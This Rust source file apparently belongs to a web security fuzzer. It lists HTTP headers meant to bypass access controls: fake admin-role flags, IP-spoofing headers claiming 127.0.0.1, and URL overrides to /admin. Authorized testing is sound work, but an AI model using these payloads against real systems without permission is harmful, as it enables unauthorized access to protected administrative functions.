use std::collections::HashMap;

pub struct HeaderFuzzer;

impl HeaderFuzzer {
    const DEBUG_HEADERS: &'static [(&'static str, &'static str)] = &[
        ("X-Debug", "true"),
        ("X-Debug-Mode", "true"),
        ("Debug", "true"),
        ("X-Test", "true"),
        ("X-Internal", "true"),
    ];

    const ADMIN_HEADERS: &'static [(&'static str, &'static str)] = &[
        ("X-Admin", "true"),
        ("X-Is-Admin", "true"),
        ("X-Role", "admin"),
        ("X-User-Role", "admin"),
        ("X-Privilege", "admin"),
        ("X-Access-Level", "admin"),
    ];

    const IP_SPOOF_HEADERS: &'static [(&'static str, &'static str)] = &[
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Real-IP", "127.0.0.1"),
        ("X-Client-IP", "127.0.0.1"),
        ("X-Originating-IP", "127.0.0.1"),
        ("CF-Connecting-IP", "127.0.0.1"),
        ("True-Client-IP", "127.0.0.1"),
        ("X-Forwarded-Host", "localhost"),
    ];

    const URL_OVERRIDE_HEADERS: &'static [(&'static str, &'static str)] = &[
        ("X-Original-URL", "/admin"),
        ("X-Rewrite-URL", "/admin"),
        ("X-Override-URL", "/admin"),
    ];

    const CUSTOM_HEADERS: &'static [(&'static str, &'static str)] = &[
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("X-Bypass-Cache", "true"),
        ("X-HTTP-Method-Override", "GET"),
    ];

    pub fn get_debug_headers() -> Vec<HashMap<String, String>> {
        Self::headers_to_vec(Self::DEBUG_HEADERS)
    }

    pub fn get_admin_headers() -> Vec<HashMap<String, String>> {
        Self::headers_to_vec(Self::ADMIN_HEADERS)
    }

    pub fn get_ip_spoof_headers() -> Vec<HashMap<String, String>> {
        Self::headers_to_vec(Self::IP_SPOOF_HEADERS)
    }

    pub fn get_url_override_headers() -> Vec<HashMap<String, String>> {
        Self::headers_to_vec(Self::URL_OVERRIDE_HEADERS)
    }

    pub fn get_all_bypass_headers() -> Vec<HashMap<String, String>> {
        let mut all = Vec::new();
        all.extend(Self::get_debug_headers());
        all.extend(Self::get_admin_headers());
        all.extend(Self::get_ip_spoof_headers());
        all.extend(Self::get_url_override_headers());
        all.extend(Self::headers_to_vec(Self::CUSTOM_HEADERS));
        all
    }

    fn headers_to_vec(headers: &[(&str, &str)]) -> Vec<HashMap<String, String>> {
        headers
            .iter()
            .map(|(k, v)| {
                let mut map = HashMap::new();
                map.insert(k.to_string(), v.to_string());
                map
            })
            .collect()
    }
}
